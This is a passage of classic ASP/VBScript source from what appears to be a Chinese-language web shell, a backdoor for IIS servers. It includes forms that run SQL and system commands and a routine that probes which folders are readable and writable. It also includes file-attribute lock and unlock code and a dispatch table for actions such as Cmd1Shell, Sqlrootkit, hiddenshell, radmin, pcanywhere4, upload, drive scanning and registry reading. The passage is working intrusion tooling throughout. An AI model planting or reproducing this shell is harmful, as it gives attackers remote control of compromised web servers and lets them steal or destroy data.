			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=CMD>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=执行>"
			   RESPONSE.WRITE "</FORM>"
		           RESPONSE.WRITE "<FORM NAME=FORM1 METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>执行语句："
			   RESPONSE.WRITE "   <INPUT NAME=SQL TYPE=TEXT>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=SQL>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=执行>"			   
			   RESPONSE.WRITE "</FORM>"                          
END IF
End Function

Function ScReWr(folder) '1.可读,不可写。2.不可读,可写。3.可读,可写。4.不可读,不可写。
 On Error Resume Next
 Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
 Set FSO = Server.Createobject("Scripting.FileSystemObject")
 Set TestFolder = FSO.GetFolder(folder)
 Set TestFileList = TestFolder.SubFolders
 RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
 For Each A in TestFileList
 Next
 If err Then
 err.Clear
	 ReWrStr = folder & " [不可读,"
	 FSO.CreateTextFile folder & RndFilename,True
	 If err Then
	 err.Clear
	 ReWrStr = ReWrStr & "不可写]"
	 Else
	 ReWrStr = ReWrStr & "可写]"
	 FSO.DeleteFile folder & RndFilename,True
	 End If
 Else
 ReWrStr = folder & "<FONT color=Red> [可读,"
	 FSO.CreateTextFile folder & RndFilename,True
	 If err Then
	 err.Clear
	 ReWrStr = ReWrStr & "不可写]</FONT>"
	 Else
	 ReWrStr = ReWrStr & "可写]</FONT>"
	 FSO.DeleteFile folder & RndFilename,True
	 End if
 End if
 Set TestFileList = Nothing
 Set TestFolder = Nothing
 Set FSO = Nothing
 ScReWr = ReWrStr
End Function
sub SavePower(PowerPath,SaveType)
Set theFile = fsoX.GetFile(PowerPath)
if SaveType=1 then
theFile.Attributes=0
o "<script language='javascript'>alert('文件已成功解锁。');window.opener.location.reload();window.close();</script>"
else
theFile.Attributes=39
o "<script language='javascript'>alert('文件锁定成功。');window.opener.location.reload();window.close();</script>"
end if
Set theFile = Nothing
end sub
sub EditPower(PowerPath)
PowerPath=replace(PowerPath,"""","")
Set theFile = fsoX.GetFile(PowerPath)
o getMyTitle(theFile,PowerPath):Set theFile = Nothing:end sub:Function getMyTitle(theOne,PowerPath):Dim strTitle:strTitle = strTitle & "<br>路径: " & theOne.Path & "" :strTitle = strTitle & "<br>大小: " & getTheSize(theOne.Size) :strTitle = strTitle & "<br>创建时间: " & theOne.DateCreated :strTitle = strTitle & "<br>最后修改: " & theOne.DateLastModified:strTitle = strTitle & "<br>最后访问: " & theOne.DateLastAccessed:strTitle = strTitle & "<br>当前权限状态: " & getAttributes(theOne.Attributes,PowerPath):getMyTitle = strTitle:End Function:Function getAttributes(intValue,PowerPath):Dim EditOK:EditOK=1:If intValue >= 128 Then:intValue = intValue - 128:End If:If intValue >= 64 Then:intValue = intValue - 64:End If:If intValue >= 32 Then:intValue = intValue - 32:End If:If intValue >= 16 Then:intValue = intValue - 16:End If:If intValue >= 8 Then:intValue = intValue - 8:End If:If intValue >= 4 Then:intValue = intValue - 4:EditOK=0:End If:If intValue >= 2 Then:intValue = intValue - 2:EditOK=0:End If:If intValue >= 1 Then:intValue = intValue - 1:EditOK=0:End If:PowerPath=replace(PowerPath,"\","\\"):if EditOK=0 then :getAttributes = "<font color=red>已锁定</font> <input type=button value=解锁 onclick=""location.href='?Action=SavePower&SaveType=1&PowerPath="&PowerPath&"'"">":else:getAttributes = "<font color=#62FF62>未锁定</font> <input type=button value=锁定 onclick=""location.href='?Action=SavePower&SaveType=2&PowerPath="&PowerPath&"'"">":end if:End Function:Function getTheSize(theSize):If theSize >= (1024 * 1024 * 1024) Then :getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G":end if:If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then :getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M":end if:If theSize >= 1024 And theSize < (1024 * 1024) Then :getTheSize = Fix((theSize / 1024) * 100) / 100 & "K":end if:If theSize >= 0 And theSize <1024 Then :getTheSize = theSize & "B":end if:End Function
Set FsoX = Nothing


Case "ReadREG":call ReadREG()
Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
Case "DownFile":DownFile FName:ShowErr()
Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
case "upfile":upfile()
Case "Cmd1Shell":Cmd1Shell()
Case "Logout":Session.Contents.Remove("webadministrators"):Response.Redirect URL
Case "CreateMdb":CreateMdb FName
Case "CompactMdb":CompactMdb FName
Case "DbManager":DbManager()
Case "Course":Course()
Case "SetFileText":SetFileText()
Case "Mssql":Mssql()
case "php":php()
Case "PageCheck":PageCheck()
Case "PageUpFile":PageUpFile()
Case "PageExecute":PageExecute()
Case "FsoFileExplorer":FsoFileExplorer()
Case "AppFileExplorer":AppFileExplorer()
Case "suftp":suftp()
Case "TSearch":TSearch()
Case "Sqlrootkit":sqlrootkit()
case "apjdel":apjdel()
Case "radmin":radmin()
Case "pcanywhere4":pcanywhere4()
Case "adminab":adminab()
Case "UpLoad":UpLoad()
case "hiddenshell":hiddenshell()
Case "ScanDriveForm":ScanDriveForm()
Case "ScanDrive": ScanDrive(Request("Drive"))
Case "ScFolder":ScFolder(Request("Folder"))
Case "MainMenu":MainMenu()
Case "EditPower":Call EditPower(request("PowerPath"))
Case "SavePower":Call SavePower(request("PowerPath"),request("SaveType"))
Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
o"</body></html>"
Sub Message(state,msg,flag)
o "<br><TABLE width=600 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#91d70d>"
o " <TR>"
o " <TD id=s align=center><b>系统信息</b></TD>"
o " </TR>"
o " <TR>"
o " <TD align=middle bgcolor=#ecfccd>"
o "	 <TABLE width=82% border=0 cellpadding=5 cellspacing=0>"
o "	 <TR>"
o "	 <TD><FONT color=red>"
o state
o "</FONT></TD>"
o "	<TR>"
o "	 <TD><P>"
o msg
o "</P></TD>"
o "	</TR>"
o "	 </TABLE>"
o "	</TD>"
o " </TR>"
o " <TR>"
o " <TD id=s height=20 align=middle>"
o "	"
If flag=0 Then
o "	 <INPUT type=button value=关闭当前页面 onclick=""window.close();"">"
o "	"
Else
o "	 <INPUT type=button value=返回上级页面 onClick=""history.go(-1);"">"
o "	"
End if
o "	</TD>"
o " </TR>"
o "</TABLE>"
End Sub
%> 
</body></html>